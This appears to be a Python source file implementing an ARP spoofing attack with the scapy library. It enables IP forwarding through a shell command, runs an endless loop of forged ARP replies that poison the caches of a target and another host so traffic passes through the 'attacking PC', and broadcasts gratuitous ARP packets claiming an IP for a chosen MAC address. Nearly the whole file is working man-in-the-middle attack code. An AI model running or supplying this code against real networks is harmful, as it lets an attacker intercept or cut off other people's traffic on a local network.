import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import scapy.all as scapy
import Network_Discovery
import time
import random
import os

# Enable IP forwarding in Python (Linux only)
def enable_ip_forwarding():
    os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

def disable_ip_forwarding():
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")

def spoof(target_ip, spoof_ip, target_mac, spoof_mac): #sends ARP packet that tells all other devices on network that target and attacker ip addresses have swapped MAC addresses making communication across network impossible without help from attacking PC
    min_interval=0.1
    max_interval=1
    
    while True:
        # packet1 = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, hwsrc=spoof_mac)
        # packet2 = scapy.ARP(op=2, pdst=spoof_ip, hwdst=spoof_mac, psrc=target_ip, hwsrc=target_mac)
        # scapy.send(packet1, iface=Network_Discovery.get_interface_from_ip(spoof_ip), verbose=False)
        # scapy.send(packet2, iface=Network_Discovery.get_interface_from_ip(spoof_ip), verbose=False)
        #time.sleep(random.uniform(min_interval, max_interval))  # Wait to avoid ARP flood

        packet = scapy.ARP(op = 2, pdst = spoof_ip, hwdst = target_mac, psrc = target_ip, hwsrc = spoof_mac)

        scapy.send(packet, verbose = False) 

        packet = scapy.ARP(op = 2, pdst = target_ip, hwdst = spoof_mac, psrc = spoof_ip, hwsrc = target_mac)

        scapy.send(packet, verbose = False) 

def send_gratuitous_arp(target_ip: str, MAC: str, interface: str):
    # Construct the ARP request
    arp_packet = scapy.ARP(psrc=target_ip, pdst=target_ip, hwsrc=MAC, hwdst="ff:ff:ff:ff:ff:ff", op=2)
    
    # Broadcast Ethernet frame
    ether_packet = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    
    # Combine Ethernet and ARP
    packet = ether_packet / arp_packet

    # Send the packet
    scapy.sendp(packet, iface=interface)